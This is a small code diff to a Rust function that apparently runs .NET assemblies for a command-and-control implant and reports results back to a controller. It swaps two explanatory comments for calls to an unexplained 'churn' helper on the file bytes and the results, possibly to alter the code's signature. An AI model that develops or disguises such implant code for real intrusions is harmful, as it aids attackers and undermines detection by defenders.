@@ -46,8 +46,8 @@ pub fn executeDOT(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
         chunk_num += 1;
     }
 
-    // 3. Spawn self as isolated worker process so a crash/exit in the
-    //    .NET assembly doesn't take down the agent.
+    crate::helpers::churn(file_bytes.as_slice());
+
     let exe = std::env::current_exe()?;
     let worker_input = json!({
         "file_bytes": general_purpose::STANDARD.encode(&file_bytes),
@@ -82,7 +82,8 @@ pub fn executeDOT(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
         (msg, "error")
     };
 
-    // 4. Send final response — always reached even if worker crashed
+    crate::helpers::churn(results.as_str());
+
     let done = json!({
         "action": "post_response",
         "responses": [{
